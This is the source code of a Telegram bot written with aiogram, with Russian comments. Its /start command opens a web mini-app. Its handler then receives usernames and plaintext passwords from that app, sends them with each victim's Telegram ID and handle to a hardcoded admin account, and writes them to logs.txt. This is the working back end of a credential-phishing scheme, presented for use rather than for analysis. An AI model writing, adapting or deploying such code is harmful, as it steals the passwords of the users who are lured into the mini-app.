import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types
from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

logging.basicConfig(level=logging.INFO)

# ===== НАСТРОЙКИ ИЗ ОКРУЖЕНИЯ =====
BOT_TOKEN = os.getenv("TOKEN-BOT") #Токен бота
WEBAPP_URL = os.getenv("URL-RENDER") #Домен с Render'а
ADMIN_ID = int(os.getenv("8392748332")) #UserId, твой уже сделал

if not BOT_TOKEN or not WEBAPP_URL or not ADMIN_ID:
    raise ValueError("Не все переменные окружения заданы!")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🚀 Открыть приложение",
                web_app=WebAppInfo(url=WEBAPP_URL)
            )]
        ]
    )
    await message.answer(
        "Нажмите кнопку, чтобы открыть мини‑приложение.",
        reply_markup=keyboard
    )

@dp.message(lambda msg: msg.web_app_data is not None)
async def handle_webapp_data(message: types.Message):
    data = message.web_app_data.data
    try:
        parts = data.split('|')
        if len(parts) == 3:
            action, username, password = parts
            log_text = (
                f"[{action.upper()}] Пользователь: {username}, Пароль: {password}, "
                f"Telegram ID: {message.from_user.id}, Username: @{message.from_user.username or 'не указан'}"
            )
            try:
                await bot.send_message(ADMIN_ID, log_text)
                logging.info(f"Сообщение админу отправлено: {log_text}")
            except Exception as e:
                logging.error(f"Не удалось отправить сообщение админу: {e}")
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(log_text + "\n")
        else:
            logging.warning(f"Неверный формат данных от {message.from_user.id}: {data}")
    except Exception as e:
        logging.error(f"Ошибка при обработке данных: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
